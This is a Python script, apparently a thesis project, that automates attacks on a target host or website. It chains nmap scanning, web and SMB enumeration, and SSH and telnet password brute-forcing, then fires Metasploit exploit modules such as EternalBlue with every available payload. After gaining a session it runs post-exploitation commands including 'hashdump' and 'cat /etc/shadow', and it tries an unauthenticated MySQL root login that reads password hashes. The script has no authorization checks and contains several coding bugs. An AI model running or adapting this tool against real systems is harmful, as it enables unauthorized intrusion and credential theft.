#!/usr/bin/env/python3
import subprocess
import sys
import os
import time
import nmap
from pymetasploit3.msfrpc import *
from scapy.all import *
from pymetasploit3.msfrpc import MsfRpcClient
from ftplib import FTP
conf.verb = 0
import pandas as pd
class colors:
    RED = "\33[91m"
    FIN = "\033[0m"
    BLUE = "\33[94m"

line = "\n"
spc = "-------------------------------------------------------------------------------"
reports_folder_name = "reports"

#help function
def help():
 print("\n[+]Enter arguments in the following order")
 print("python3 thesis.py -h/--host <ip address or URL----> http://www.abc.com or https://abc.com >")
 exit()


#Function to perform Nmap Scan
def nw_scan(ipaddr_or_url,webapp):
 nmscan = nmap.PortScanner()
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
   print(line)
   print("Starting Nmap Scan \n")
   print("Starting Nmap Scan \n",file=f)
   os_results = nmscan.scan(arguments=' -T4 -p- -sV -O', hosts=ipaddr_or_url)
   for ipaddr_or_url in nmscan.all_hosts():
    print('Host : %s (%s)' % (ipaddr_or_url, nmscan[ipaddr_or_url].hostname()))
    print('State : %s' % nmscan[ipaddr_or_url].state())
    print('Host : %s (%s)' % (ipaddr_or_url, nmscan[ipaddr_or_url].hostname()), file=f)
    print('State : %s' % nmscan[ipaddr_or_url].state(), file =f)
    if(len(nmscan[ipaddr_or_url]['addresses'])>0):
     if('mac' in nmscan[ipaddr_or_url]['addresses']):
      print('MAC : %s' % nmscan[ipaddr_or_url]['addresses']['mac'])
      print('MAC : %s' % nmscan[ipaddr_or_url]['addresses']['mac'], file =f)
    if(len(nmscan[ipaddr_or_url]['vendor'])>0):
     if('vendor' in nmscan[ipaddr_or_url]):
      print('Vendor : %s' % nmscan[ipaddr_or_url]['vendor'][nmscan[ipaddr_or_url]['addresses']['mac']])
      print('Vendor : %s' % nmscan[ipaddr_or_url]['vendor'][nmscan[ipaddr_or_url]['addresses']['mac']], file =f)
    ops=""
    if(len(nmscan[ipaddr_or_url]['osmatch'])>0):
     if('osmatch' in nmscan[ipaddr_or_url]):
      print('Operating System : %s' % nmscan[ipaddr_or_url]['osmatch'][0]['name'])
      print('Operating System : %s' % nmscan[ipaddr_or_url]['osmatch'][0]['name'], file =f)
     if ('Windows' in nmscan[ipaddr_or_url]['osmatch'][0]['name']):
      ops="Windows"
     elif('Linux' in nmscan[ipaddr_or_url]['osmatch'][0]['name']):
      ops="Linux"
     elif('Unix' in nmscan[ipaddr_or_url]['osmatch'][0]['name']):
      ops="Linux"
     else:
      ops="unidentified"
    for proto in nmscan[ipaddr_or_url].all_protocols():
     print('Protocol : %s' % proto, file =f)
     print(spc,file=f)
     lport = nmscan[ipaddr_or_url][proto].keys()
     lport=list(lport)
     for port in lport:
      print('port : %s\tstate : %s\tservice : %s   (%s)' % (port, nmscan[ipaddr_or_url][proto][port]['state'],nmscan[ipaddr_or_url][proto][port]['name'], nmscan[ipaddr_or_url][proto][port]['product']+nmscan[ipaddr_or_url][proto][port]['version'] ))
      print('port : %s\tstate : %s\tservice : %s   (%s)' % (port, nmscan[ipaddr_or_url][proto][port]['state'],nmscan[ipaddr_or_url][proto][port]['name'], nmscan[ipaddr_or_url][proto][port]['product']+nmscan[ipaddr_or_url][proto][port]['version'] ), file =f)
      ls_script=['http-title','ftp-anon','ftp-syst','ssh-hostkey','smtp-commands','dns-nsid','http-server-header','mysql-info','ssl-date','vnc-info','irc-info','ajp-methods','http-favicon']
      if('script' in nmscan[ipaddr_or_url][proto][port]):
       for sc in ls_script:
        if( sc in nmscan[ipaddr_or_url][proto][port]['script']):
         print(nmscan[ipaddr_or_url][proto][port]['script'][sc], file =f)
      print(line)
      print(line,file=f)
   print(line)
   print(line)




 #Enumerating 80 and 443
 if(80 in lport):
  if(443 in lport):
   lport.remove(80)
   lport.remove(443)
   if(webapp==False):
    port80_443enum(ipaddr_or_url,'80,443',ops)
   else:
    metasploit_enum(ipaddr_or_url,"80,443",ops)

 if(80 in lport):
  if(443 not in lport):
   lport.remove(80)
   if(webapp==False):
    port80enum(ipaddr_or_url,'80,443',ops)
   else:
    metasploit_enum(ipaddr_or_url,'80,443',ops)

 if(443 in lport):
  if(80 not in lport):
   lport.remove(443)
   if(webapp==False):
    port443enum(ipaddr_or_url,'80,443',ops)
   else:
    metasploit_enum(ipaddr_or_url,"80,443",ops)



 #Enumerating 139 and 445
 if((139 in lport) or (445 in lport)):
  if(139 in lport):
   lport.remove(139)
  if(443 in lport):
   lport.remove(443)
  port139_445enum(ipaddr_or_url,"139,445",ops)


 #Enumerating 21
 if((21 in lport)or(2121 in lport)):
  if(21 in lport):
   lport.remove(21) 
  if(2121 in lport):
   lport.remove(2121)
  port21_2121enum(ipaddr_or_url,"21,2121",ops)


 #Enumerating 22
 if(22 in lport):
  lport.remove(22)
  metasploit_enum(ipaddr_or_url,"22",ops)

 #Enumerating 23
 if(23 in lport):
  lport.remove(23)
  metasploit_enum(ipaddr_or_url,"23",ops)


 #Enumerating 10000
 if(10000 in lport):
  lport.remove(10000)
  metasploit_enum(ipaddr_or_url,"10000",ops)

 #Enumerating 6667
 if(6667 in lport):
  lport.remove(6667)
  metasploit_enum(ipaddr_or_url,"6667",ops)

 #Enumerating 3632
 if(3632 in lport):
  lport.remove(3632)
  metasploit_enum(ipaddr_or_url,"3632",ops)

 #Enumerating 3389
 if(3389 in lport):
  lport.remove(3389)
  port3389_enum(ipaddr_or_url,"3389",ops)

 #Enumerating 3306
 if(3306 in lport):
  lport.remove(3306)
  port3306_enum(ipaddr_or_url,"3306",ops)

 #Enumerating 2049
 if(2049 in lport):
  lport.remove(2049)
  port2049_enum(ipaddr_or_url,"2049",ops)

 #Enumerating 135
 if(135 in lport):
  lport.remove(135)
  port135_enum(ipaddr_or_url,"135",ops)

 #Enumerating 111
 if(111 in lport):
  lport.remove(111)
  port111_enum(ipaddr_or_url,"111",ops)

 #Enumerating 25
 if(25 in lport):
  lport.remove(25)
  metasploit_enum(ipaddr_or_url,"25",ops)

 #Remaining Ports
 for pt in lport:
  metasploit_enum(ipaddr_or_url,str(pt),ops)



#Function For enumerating Metasploit Auxiliary Modules.
def metasploit_enum(ipaddr_or_url,port,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  print(line)
  print(spc)
  print(line,file=f)
  print(spc,file=f)
  os.system('msfrpcd -P yourpassword -S')
  print(line)
  print(spc)
  print(line,file=f)
  print(spc,file=f)
 #Connecting to msfrpcd service
  time.sleep(10)
  client = MsfRpcClient('yourpassword', ssl=False)
  console = client.consoles.console()
  df = pd.read_csv("metasploit_enum_exp.csv")
  port_list = df['Port'].tolist()
  port_list = list(set(port_list))
  mod_list=[]
  current_dir =os.getcwd() 
  if port in port_list:
   enum_list= (df[(df['OS'] =='Any') & (df['Module_Type']=='auxiliary') & (df['Port']==port)])
   mod_list=enum_list['Module'].tolist()
   aux_list=[]
   if(len(mod_list)>0):
    print("Using metasploit auxiliary modules for enumeration of port "+port)
    print(spc)
    print("Using metasploit auxiliary modules for enumeration of port "+port,file=f)
    print(spc,file=f)
    for element in mod_list:
     md=element.split("/")
     aux_list = (md[1]+"/"+md[2]+"/"+md[3])
     print(spc)
     print(line)
     print(spc,file=f) 
     print(line,file=f)
     print("-----------------------------------Using "+md[3]+" module---------------------------------")
     print(line)
     print("-----------------------------------Using "+md[3]+" module---------------------------------",file=f)
     print(line,file=f) 
     aux= client.modules.use('auxiliary', aux_list)
     if(md[3] == "telnet_login"):
      aux['RHOSTS']= ipaddr_or_url
      aux['USER_FILE'] = current_dir+'/user.txt'
      aux['PASS_FILE'] = current_dir+'/pass.txt'
     elif(md[3]=='ssh_identify_pubkeys'):
      aux['KEY_FILE'] = current_dir+'/user.txt'
     elif(md[3]=='ssh_login'):
      aux['RHOSTS']= ipaddr_or_url
      aux['USER_FILE'] = current_dir+'/user.txt'
      aux['PASS_FILE'] = current_dir+'/pass.txt'
     elif(md[3]=='ssh_login'):
      aux['RHOSTS'] = ipaddr_or_url
      aux['USER_FILE'] = current_dir+'/user.txt'
     else:
      aux['RHOSTS'] = ipaddr_or_url
     output = console.run_module_with_output(aux)
     print(output)
     print(line)
     print(spc)
     print(output,file=f)
     print(line,file=f)
     print(spc,file=f)
   else:
    print("-----------No Metasploit Auxiliary Module Found for port "+port+" -----------")
    print("-----------No Metasploit Auxiliary Module Found for port "+port+" -----------",file=f)
  else:
   print("-----------No Metasploit Auxiliary Module Found for port "+port+" -----------")
   print("-----------No Metasploit Auxiliary Module Found for port "+port+" -----------",file=f)
  metasploit_exp(ipaddr_or_url,port,ops) 



#Function to Exploit Metasploit Exploit Modules
def metasploit_exp(ipaddr_or_url,port,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  client = MsfRpcClient('yourpassword', ssl=False)
  df = pd.read_csv("metasploit_enum_exp.csv")
  port_list = df['Port'].tolist()
  port_list = list(set(port_list))
  mod_list=[]
  if port in port_list:
   exp_list= (df[(df['OS'] =='Any') & (df['Module_Type']=='exploit') & (df['Port']==port)])
   mod_list=exp_list['Module'].tolist()
   if(ops=="Windows"):
    exp_list= (df[(df['OS'] =='Windows') & (df['Module_Type']=='exploit') & (df['Port']==port)])
    mod_list_wn =  exp_list['Module'].tolist()
    mod_list = mod_list+mod_list_wn
   if(ops=="Linux"):
    exp_list= (df[(df['OS'] =='Linux') & (df['Module_Type']=='exploit') & (df['Port']==port)])
    mod_list_ln =  exp_list['Module'].tolist()
    mod_list=mod_list+mod_list_ln
   if(len(mod_list)>0):
    print(line)
    print(spc)
    print("Using metasploit exploit modules for exploitation of port "+port)
    print(line,file=f)
    print(spc,file=f) 
    print("Using metasploit exploit modules for exploitation of port "+port,file=f) 
    for element in mod_list:
     md=element.split("/")
     print(line)
     print("Using "+md[3]+" module")
     print(line,file=f)
     print("Using "+md[3]+" module",file=f)
     exp = client.modules.use('exploit', element)
     if(md[3] == "ms17_010_eternalblue"):
      exp['CheckModule']= 'auxiliary/scanner/smb/smb_ms17_010'
      exp['RHOSTS'] = ipaddr_or_url
     else:
      exp['RHOSTS'] = ipaddr_or_url
     pld = exp.targetpayloads()
     for item in pld:
      if(len(client.sessions.list)==0):
       exp.execute(payload=item)
      else:
       print(line)
       print("Successfully able to exploit using metasploit module -----> "+md[3]+" and payload-----> "+item)
       print(line)
       print(line,file=f)
       print("Successfully able to exploit using metasploit module -----> "+md[3]+" and payload-----> "+item,file=f)
       print(line,file=f)
       print(spc)
       print(line)
       print(spc,file=f)
       print(line,file=f)
       post_exp(item,ops)
       print(line)
       print(spc)
       print(line,file=f)
       print(spc,file=f)
       os.system("pkill -f 'msfrpcd'")
       sys.exit(1)
    print("Unable to exploit the target using modules of port "+port)
    print("Unable to exploit the target using modules of port "+port,file=f)  
    os.system("pkill -f 'msfrpcd'")
   else:
    print("----------No Metasploit Exploit Module Found for port "+port+" ------------")
    print("----------No Metasploit Exploit Module Found for port "+port+" ------------",file=f)
    if(len(client.sessions.list)>0):
     item="unknown"
     post_exp(item,ops)
     os.system("pkill -f 'msfrpcd'")
     exit()
    os.system("pkill -f 'msfrpcd'")
  else:
   print("----------No Metasploit Exploit Module Found for port "+port+" ------------")
   print("----------No Metasploit Exploit Module Found for port "+port+" ------------",file=f)
   if(len(client.sessions.list)>0):
    item="unknown"
    post_exp(item,ops)
    os.system("pkill -f 'msfrpcd'")
    exit()
   os.system("pkill -f 'msfrpcd'")





#Function to perform Post Exploitation Attack
def post_exp(item,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  client = MsfRpcClient('yourpassword', ssl=False)
  if(('meterpreter' in item)or(ops=='Windows')):
   pd = ['getuid','sysinfo','hashdump']
  else:
   pd=['ls','whoami','hostname','cat /etc/passwd','cat /etc/shadow','route print','arp -a','netstat -ano','uname -a','ls -la','sudo -l','history']
  print(line)
  print("-----------------------Executing Post Exploitation Commands-----------------------------")
  print(line,file=f)
  print("-----------------------Executing Post Exploitation Commands-----------------------------",file=f)
  try:
   shell = client.sessions.session('1')
   for element in pd:
    print(line)
    print(line)
    print("--------------------------Executing Command ----> " +element+ " --------------------------")
    print(line,file=f)
    print(line,file=f)
    print("--------------------------Executing Command ----> " +element+ " --------------------------",file=f)
    shell.write(element)
    print(shell.read())
    print(shell.read(),file=f)
  except:
   print("Unable to Execute Post Exploitation using the current payload")
   os.system("pkill -f 'msfrpcd'")


#Function to enumerate port 111
def port111_enum(ipaddr_or_url,port,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  print("--------------------Using showmount----------------")
  print("--------------------Using showmount----------------",file=f)
  op = os.popen('showmount -a {}'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
  op=os.popen('showmount -d {}'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
  op=os.popen('showmount -e {}'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
 metasploit_enum(ipaddr_or_url,port,ops)



#Function to enumerate port 135
def port135_enum(ipaddr_or_url,port,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  print("--------------------Using rpcinfo----------------")
  print("--------------------Using rpcinfo----------------",file=f)
  op =os.popen('rpcinfo -p {}'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
 metasploit_enum(ipaddr_or_url,port,ops)




#Function to enumerate port 3389
def port3389_enum(ipaddr_or_url,port,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  print("--------------------Using rdesktop----------------")
  print("--------------------Using rdesktop----------------",file=f)
  op = os.popen('rdesktop {} &'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
 metasploit_enum(ipaddr_or_url,port,ops)




#Function to enumerate port 2049
def port2049_enum(ipaddr_or_url,port,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  print("--------------------Using rpcinfo----------------")
  print("--------------------Using rpcinfo----------------",file=f)
  op=os.popen('rpcinfo -p {}'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
  print("--------------------Using showmount----------------")
  print("--------------------Using showmount----------------",file=f)
  op = os.popen('showmount -e {}'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
  print("--------------------Using smbclient----------------")
  print("--------------------Using smbclient----------------",file=f)
  op = os.popen('smbclient -L {} -U " "%" "'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
 metasploit_enum(ipaddr_or_url,port,ops) 


#Function to Enumerate port 3306
def port3306_enum(ipaddr_or_url,port,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  print("--------------------Using mysql to identify databases----------------")
  rint("--------------------Using mysql to identify databases----------------",file=f)
  op=os.popen("mysql -u root -h {} -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;'".format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
 metasploit_enum(ipaddr_or_url,port,ops)


#Function to enumerate port 80 and 443
def port80_443enum(ipaddr_or_url,port,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  print("--------------------Performing Nikto Scan as port 80 and 443 are open----------------")
  print("--------------------Performing Nikto Scan as port 80 and 443 are open----------------",file=f)
  op=os.popen('nikto -h http://{}'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
  input_var1 = "http://"+ipaddr_or_url
  print("--------------------Performing Directory Bursting using Dirb as port 80 and 443 are open----------------")
  print("--------------------Performing Directory Bursting using Dirb as port 80 and 443 are open----------------",file=f)
  current_dir =os.getcwd() 
  op =os.popen('dirb {} {}'.format(input_var1,current_dir+ "/wordlist.txt")).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
 metasploit_enum(ipaddr_or_url,port,ops)

#Function to enumerate only port 80
def port80enum(ipaddr_or_url,port,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  print("--------------------Performing Nikto Scan as only port 80 is open----------------")
  print("--------------------Performing Nikto Scan as only port 80 is open----------------",file=f)
  op = os.popen('nikto -h http://{}'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
  input_var1 = "http://"+ipaddr_or_url
  print("--------------------Performing Directory Bursting using Dirb as port 80 is open----------------")
  print("--------------------Performing Directory Bursting using Dirb as port 80 is open----------------",file=f)
  current_dir =os.getcwd()
  op = os.popen('dirb {} {}'.format(input_var1, current_dir+"/wordlist.txt")).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
 metasploit_enum(ipaddr_or_url,port,ops)

#Function to enumerate only port 443
def port443enum(ipaddr_or_url,port,ops): 
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  print("--------------------Performing Nikto Scan as port 443 is open----------------")
  print("--------------------Performing Nikto Scan as port 443 is open----------------",file=f)
  op = os.popen('nikto -h https://{}'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
  input_var1 = "https://"+ipaddr_or_url
  print("--------------------Performing Directory Bursting using Dirb as port 443 is open----------------")
  print("--------------------Performing Directory Bursting using Dirb as port 443 is open----------------",file=f)
  current_dir =os.getcwd()
  op = os.popen('dirb {} {}'.format(input_var1, current_dir+"/wordlist.txt")).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
 metasploit_enum(ipaddr_or_url,port,ops)



#Function to enumeare port 139 or 445
def port139_445enum(ipaddr_or_url,port,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  print("--------------------SMB Client----------------")
  print("--------------------SMB Client----------------",file=f)
  op=os.popen('smbclient '+'-N '+ '-L '+'\\\\{}\\'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f) 
  print("----------------------enum4linux------------------")
  print("----------------------enum4linux------------------",file=f)
  op=os.popen('enum4linux {}'.format(ipaddr_or_url)).read
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
  print("----------------------nbtscan------------------")
  print("----------------------nbtscan------------------",file=f)
  op=os.popen('nbtscan {}'.format(ipaddr_or_url)).read()
  print(op)
  print(line)
  print(spc)
  print(op,file=f)
  print(line,file=f)
  print(spc,file=f)
 metasploit_enum(ipaddr_or_url,port,ops)


#Function to enumerate port 21 or 2121
def port21_2121enum(ipaddr_or_url,port,ops):
 final_report = reports_folder_name +"/report.txt"
 with open (final_report,'a') as f:
  ftp = FTP(ipaddr_or_url)
  aut = ftp.login()
  if aut:
   print(aut)
   print(line)
   print("Tried Anonymous as username and password and successfully able to login")
   print(spc)
   print(line)
   print(aut,file=f)
   print(line,file =f)
   print("Tried Anonymous as username and password and successfully able to login",file=f)
   print(spc,file=f)
   print(line,file=f)
  else:
   print("Anonymous FTP Login is not allowed")
   Print("Anonymous FTP Login is not allowed",file=f)
 metasploit_enum(ipaddr_or_url,port,ops)


#Function to perform ICMP scan to check if the target is up
def active_recon(input_var):
 try:
  print(line)
  webapp=False
  print("===========Pinging to check if the host "+input_var+" is up===========")
  input_var1 = input_var
  if "https" in input_var1:
   input_var1 = input_var1[0:-1]
   input_var1= input_var1.replace("https://www." ,"")
   pkt=IP(dst=input_var1)

  elif "http" in input_var:
   input_var1= input_var1.replace("http://www." ,"")
   pkt=IP(dst=input_var1)
  else:
   pkt=IP(dst=input_var)

  icmp=ICMP()
  req=pkt/icmp
  resp, unans = sr(req, timeout=1)
  if resp:
   print(line)
   print(line)
   print("========== Host is up ================")
   if ((("http://www" in input_var) and (".com" in input_var)) or  (("https://www" in input_var)and (".com" in input_var))):
    web_enum(input_var1,input_var)
   else:
    final_report = reports_folder_name +"/report.txt"
    with open(final_report,'w')as f:
     print(line,file=f)
    nw_scan(input_var,webapp)
  else:
   print(line)
   print(line)
   print("===========Host is not up, Please try with any other IP Address===============")
 except socket.gaierror:
  print('Enter a valid IP Address or URL')
  exit()



#Function to create reports directory
def check_output_directory(directory_name):
    current_directory = os.getcwd()
    full_path_to_dir = current_directory + "/" + directory_name
    if not os.path.exists(full_path_to_dir):
        os.makedirs(full_path_to_dir)
    pass


#main function accepting user input as IP or URL
def main():
  check_output_directory(reports_folder_name)
  args= sys.argv
  if(len(args) ==3):
   if("-h" in args):
    input_var = args[args.index("-h")+1]
   elif("--host" in args):
    input_var = args[args.index("--host")+1]
   else:
    help()
   active_recon(input_var)
  else:
   help()


#Function to enumeaate a website
def web_enum(input_var,input_var1):
  final_report = reports_folder_name +"/report.txt"
  with open(final_report,'w')as f:
    print(colors.RED + "--------------------DNS Information--------------------",file=f)
    print(colors.RED + "--------------------DNS Information--------------------")
    op=os.popen("dig {} ".format(input_var)).read()
    print(op)
    print(op,file=f)
    print(line,file=f)
    print(line)
    print(spc)
    print(colors.BLUE + "------Identify Technologies Used by the website-------",file=f)
    print(colors.BLUE + "------Identify Technologies Used by the website-------")  
    op = os.popen('whatweb -v -a 3 {}'.format(input_var)).read()
    print(op)
    print(op,file=f) 
    output_split_comma = op.split(",")
    for i in output_split_comma:
     sys.stdout.flush()
     time.sleep(0.02) 
    print(line,file=f)
    print(line)
    print(spc)
    print(colors.RED + "--------------Scanning for Directories using Dirb---------------",file=f)
    print(colors.RED + "--------------Scanning for Directories using Dirb---------------")
    if "http" in input_var1:
     input_var1 = input_var1.replace("http://www." ,"http://")
     print(input_var1)
    current_dir =os.getcwd()
    op=os.popen('dirb {} {}'.format(input_var1, current_dir+"/wordlist.txt")).read()
    print(op)
    print(op,file=f)
    print(line,file=f)
    print(line)
    print(spc)
    print(colors.BLUE + "--------------------Finding Subdirectory--------------------",file=f)
    print(colors.BLUE + "--------------------Finding Subdirectory--------------------")
    op=os.popen('sublist3r -d {}'.format(input_var.replace("www.", ""))).read()
    print(op)
    print(op,file=f)
    print(line,file=f)
    print(line)
    print(spc)
    print(colors.FIN + "--------------------Nikto Scan--------------------",file=f)
    print(colors.FIN + "--------------------Nikto Scan--------------------")
    op = os.popen('nikto -h {}'.format(input_var)).read()
    print(op)
    print(op,file=f)
    print(line,file=f)
    print(line)
    print(spc)
    print(colors.BLUE + "--------------------NSLookup--------------------",file=f)
    print(colors.BLUE + "--------------------NSLookup--------------------")
    op = os.popen('nslookup {}'.format(input_var)).read()
    print(op)
    print(op,file=f)
    print(line,file=f)
    print(line)
    print(spc)
    print(colors.RED + "--------------------Harvestor Scan--------------------",file=f)
    print(colors.RED + "--------------------Harvestor Scan--------------------")
    op =os.popen('theHarvester -d {}'.format(input_var.replace("www.", ""))+" -l 500 -b google").read()
    print(op)
    print(op,file=f)
    webapp=True
    nw_scan(input_var,webapp)
main()


